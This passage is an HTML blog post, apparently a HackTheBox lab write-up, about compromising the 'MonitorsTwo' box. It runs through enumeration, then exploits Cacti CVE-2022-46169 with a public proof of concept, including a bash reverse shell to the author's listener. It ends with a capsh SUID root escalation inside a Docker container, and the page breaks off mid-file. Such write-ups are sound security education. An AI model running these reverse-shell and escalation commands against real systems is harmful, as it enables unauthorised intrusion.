@@ -1,0 +1,1454 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="MonitorsTwo is an easy difficulty box running an outdated Cacti server. It is vulnerable to Remote Code Execution, with well-documented Proof of Concept scripts available. Upon entering the system, we quickly find that it is a docker container, with MySQL database credentials placed in an easily discoverable file at the base directory. The database contains credentials for a user on the system, which we can connect via ssh. Within the mail folder, our controlled user has a mail file listing several vulnerabilities the system had at one point, and not all of them are resolved. We can abuse CVE-2021-41091, where insecure file permissions on a docker container's file system allows any user to enter. With root authority inside the container we can create a simple backdoor binary and execute it as our uncredentialed user, escalating our privileges to root authority outside the docker container.">
+<title>HackTheBox - MonitorsTwo</title>
+
+<link rel='canonical' href='http://localhost:1313/p/hackthebox-monitorstwo/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="HackTheBox - MonitorsTwo">
+<meta property='og:description' content="MonitorsTwo is an easy difficulty box running an outdated Cacti server. It is vulnerable to Remote Code Execution, with well-documented Proof of Concept scripts available. Upon entering the system, we quickly find that it is a docker container, with MySQL database credentials placed in an easily discoverable file at the base directory. The database contains credentials for a user on the system, which we can connect via ssh. Within the mail folder, our controlled user has a mail file listing several vulnerabilities the system had at one point, and not all of them are resolved. We can abuse CVE-2021-41091, where insecure file permissions on a docker container's file system allows any user to enter. With root authority inside the container we can create a simple backdoor binary and execute it as our uncredentialed user, escalating our privileges to root authority outside the docker container.">
+<meta property='og:url' content='http://localhost:1313/p/hackthebox-monitorstwo/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Cacti' /><meta property='article:tag' content='Remote Code Execution' /><meta property='article:tag' content='docker' /><meta property='article:tag' content='SUID' /><meta property='article:tag' content='MySQL' /><meta property='article:tag' content='hashcat' /><meta property='article:published_time' content='2023-09-02T12:27:00-05:00'/><meta property='article:modified_time' content='2023-09-02T12:27:00-05:00'/><meta property='og:image' content='http://localhost:1313/p/hackthebox-monitorstwo/MonitorsTwo.png' />
+<meta name="twitter:title" content="HackTheBox - MonitorsTwo">
+<meta name="twitter:description" content="MonitorsTwo is an easy difficulty box running an outdated Cacti server. It is vulnerable to Remote Code Execution, with well-documented Proof of Concept scripts available. Upon entering the system, we quickly find that it is a docker container, with MySQL database credentials placed in an easily discoverable file at the base directory. The database contains credentials for a user on the system, which we can connect via ssh. Within the mail folder, our controlled user has a mail file listing several vulnerabilities the system had at one point, and not all of them are resolved. We can abuse CVE-2021-41091, where insecure file permissions on a docker container's file system allows any user to enter. With root authority inside the container we can create a simple backdoor binary and execute it as our uncredentialed user, escalating our privileges to root authority outside the docker container."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/p/hackthebox-monitorstwo/MonitorsTwo.png' />
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu897059592634026878.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a>
+      <ol>
+        <li><a href="#utilizing-cve-2022-46169">Utilizing CVE 2022-46169</a></li>
+        <li><a href="#enumerating-docker-container">Enumerating docker container</a></li>
+        <li><a href="#connecting-to-mysql-database">Connecting to mysql database</a></li>
+        <li><a href="#escaping-the-docker-container">Escaping the docker container</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ol>
+        <li><a href="#finding-system-vulnerabilities-discussed-in-mail">Finding system vulnerabilities discussed in mail</a></li>
+        <li><a href="#abusing-cve-2021-41091">Abusing CVE-2021-41091</a></li>
+      </ol>
+    </li>
+    <li><a href="#reflection">Reflection</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/hackthebox-monitorstwo/">
+                <img src="/p/hackthebox-monitorstwo/MonitorsTwo_hu11592254038047108549.png"
+                        srcset="/p/hackthebox-monitorstwo/MonitorsTwo_hu11592254038047108549.png 800w, /p/hackthebox-monitorstwo/MonitorsTwo_hu17856574127821748207.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - MonitorsTwo" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack the Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/hackthebox-monitorstwo/">HackTheBox - MonitorsTwo</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            MonitorsTwo is an easy difficulty box running an outdated Cacti server. It is vulnerable to Remote Code Execution, with well-documented Proof of Concept scripts available. Upon entering the system, we quickly find that it is a docker container, with MySQL database credentials placed in an easily discoverable file at the base directory. The database contains credentials for a user on the system, which we can connect via ssh. Within the mail folder, our controlled user has a mail file listing several vulnerabilities the system had at one point, and not all of them are resolved. We can abuse CVE-2021-41091, where insecure file permissions on a docker container&#39;s file system allows any user to enter. With root authority inside the container we can create a simple backdoor binary and execute it as our uncredentialed user, escalating our privileges to root authority outside the docker container.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 02, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    12 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="enumeration">Enumeration
+</h2><p>Initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Starting Nmap 7.94 ( https://nmap.org ) at 2023-04-30 10:18 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.10.11.211
+</span></span><span class="line"><span class="cl">Host is up (0.032s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+</span></span><span class="line"><span class="cl">|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-title: Login to Cacti
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Visiting the website, the default page has a login box, with a reference to The Cacti Group:</p>
+<p><img src="/p/hackthebox-monitorstwo/Images/mainpage.png"
+	width="532"
+	height="398"
+	srcset="/p/hackthebox-monitorstwo/Images/mainpage_hu9427314356021566830.png 480w, /p/hackthebox-monitorstwo/Images/mainpage_hu4808441376150999104.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="133"
+		data-flex-basis="320px"
+	
+></p>
+<p>Using directory fuzzing, we see can see more info on the backend server by viewing the changelog:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ feroxbuster -u http://10.10.11.211/                                                                          
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> ___  ___  __   __     __      __         __   ___
+</span></span><span class="line"><span class="cl">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+</span></span><span class="line"><span class="cl">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+</span></span><span class="line"><span class="cl">by Ben &#34;epi&#34; Risher 🤓                 ver: 2.10.0
+</span></span><span class="line"><span class="cl">───────────────────────────┬──────────────────────
+</span></span><span class="line"><span class="cl"> 🎯  Target Url            │ http://10.10.11.211/
+</span></span><span class="line"><span class="cl"> 🚀  Threads               │ 50
+</span></span><span class="line"><span class="cl"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+</span></span><span class="line"><span class="cl"> 👌  Status Codes          │ All Status Codes!
+</span></span><span class="line"><span class="cl"> 💥  Timeout (secs)        │ 7
+</span></span><span class="line"><span class="cl"> 🦡  User-Agent            │ feroxbuster/2.10.0
+</span></span><span class="line"><span class="cl"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+</span></span><span class="line"><span class="cl"> 🔎  Extract Links         │ true
+</span></span><span class="line"><span class="cl"> 🏁  HTTP methods          │ [GET]
+</span></span><span class="line"><span class="cl"> 🔃  Recursion Depth       │ 4
+</span></span><span class="line"><span class="cl">───────────────────────────┴──────────────────────
+</span></span><span class="line"><span class="cl"> 🏁  Press [ENTER] to use the Scan Management Menu™
+</span></span><span class="line"><span class="cl">──────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">200      GET        0l        0w   254887c http://10.10.11.211/CHANGELOG
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The changelog also tells us that this is for Cacti version 1.2.22, which was seen at the footer of the login page.</p>
+<p><img src="/p/hackthebox-monitorstwo/Images/cactichangelog.png"
+	width="731"
+	height="312"
+	srcset="/p/hackthebox-monitorstwo/Images/cactichangelog_hu6780226003569752426.png 480w, /p/hackthebox-monitorstwo/Images/cactichangelog_hu9741661793358053143.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="234"
+		data-flex-basis="562px"
+	
+></p>
+<p>A quick google search shows that cacti 1.2.22 has <a class="link" href="https://nvd.nist.gov/vuln/detail/cve-2022-46169"  target="_blank" rel="noopener"
+    >a remote command execution vulnerability.</a> Utilizing this CVE, we can have remote code execution.</p>
+<h2 id="foothold">Foothold
+</h2><h3 id="utilizing-cve-2022-46169">Utilizing CVE 2022-46169
+</h3><p>POC code obtained from <a class="link" href="https://github.com/sAsPeCt488/CVE-2022-46169"  target="_blank" rel="noopener"
+    >this github repository</a>
+Testing the POC with a curl command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python poc.py -c &#39;curl 10.10.14.139&#39; http://10.10.11.211
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On my listener server, I see a hit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ nc -nvlp 80  
+</span></span><span class="line"><span class="cl">listening on [any] 80 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.139] from (UNKNOWN) [10.10.11.211] 39370
+</span></span><span class="line"><span class="cl">GET / HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 10.10.14.139
+</span></span><span class="line"><span class="cl">User-Agent: curl/7.74.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we can go ahead and try a reverse shell payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python poc.py -c &#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.139/8888 0&gt;&amp;1&#39;&#34; http://10.10.11.211
+</span></span><span class="line"><span class="cl">[*] Trying for 1 - 100 host ids
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Meanwhile on my listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">nvlp</span> <span class="mi">8888</span>
+</span></span><span class="line"><span class="cl"><span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">8888</span> <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.139</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.211</span><span class="p">]</span> <span class="mi">58858</span>
+</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="n">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">1</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
+</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="mi">50</span><span class="n">bca5e748b0</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="enumerating-docker-container">Enumerating docker container
+</h3><p>Looking at SUID privileges, we see a very dangerous SUID set in <code>capsh</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@50bca5e748b0:/$ find / -perm /4000 2&gt; /dev/null
+</span></span><span class="line"><span class="cl">/usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">/usr/bin/passwd
+</span></span><span class="line"><span class="cl">/usr/bin/chsh
+</span></span><span class="line"><span class="cl">/usr/bin/chfn
+</span></span><span class="line"><span class="cl">/usr/bin/newgrp
+</span></span><span class="line"><span class="cl">/sbin/capsh
+</span></span><span class="line"><span class="cl">/bin/mount
+</span></span><span class="line"><span class="cl">/bin/umount
+</span></span><span class="line"><span class="cl">/bin/su
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://gtfobins.github.io/gtfobins/capsh/"  target="_blank" rel="noopener"
+    >gtfobins</a> covers how we might abuse this setting to elevate our privileges to root level:</p>
+<p><img src="/p/hackthebox-monitorstwo/Images/capsh.png"
+	width="812"
+	height="296"
+	srcset="/p/hackthebox-monitorstwo/Images/capsh_hu15624475363772085949.png 480w, /p/hackthebox-monitorstwo/Images/capsh_hu11753095553499037203.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="274"
+		data-flex-basis="658px"
+	
+></p>
+<p>By abusing this 2nd command we become the root user. However, there is something strange about this filesystem.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@50bca5e748b0:/$ capsh --gid=0 --uid=0 --
+</span></span><span class="line"><span class="cl">root@50bca5e748b0:/# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There are no home folders, and root has no flag as well:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@50bca5e748b0:/# ls -al /home/
+</span></span><span class="line"><span class="cl">total 8
+</span></span><span class="line"><span class="cl">drwxr-xr-x 2 root root 4096 Mar 22 13:21 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 1 root root 4096 Mar 21 10:49 ..
+</span></span><span class="line"><span class="cl">root@50bca5e748b0:/# ls -al /root/
+</span></span><span class="line"><span class="cl">total 16
+</span></span><span class="line"><span class="cl">drwx------ 1 root root 4096 Mar 21 10:50 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 1 root root 4096 Mar 21 10:49 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx 1 root root    9 Jan  9  2023 .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
+</span></span><span class="line"><span class="cl">lrwxrwxrwx 1 root root    9 Mar 21 10:50 .mysql_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Enumerating the file system some more shows that this is a docker container:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@50bca5e748b0:/# ls -al
+</span></span><span class="line"><span class="cl">total 84
+</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Mar 21 10:49 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Mar 21 10:49 ..
+</span></span><span class="line"><span class="cl">-rwxr-xr-x   1 root root    0 Mar 21 10:49 .dockerenv
+</span></span><span class="line"><span class="cl">drwxr-xr-x   1 root root 4096 Mar 22 13:21 bin
+</span></span><span class="line"><span class="cl">drwxr-xr-x   2 root root 4096 Mar 22 13:21 boot
+</span></span><span class="line"><span class="cl">drwxr-xr-x   5 root root  340 Apr 30 22:55 dev
+</span></span><span class="line"><span class="cl">-rw-r--r--   1 root root  648 Jan  5  2023 entrypoint.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>in the base directory <code>/</code>, we see a <code>.dockerenv</code> file, as well as an unusual <code>entrypoint.sh</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@50bca5e748b0:/# cat entrypoint.sh 
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
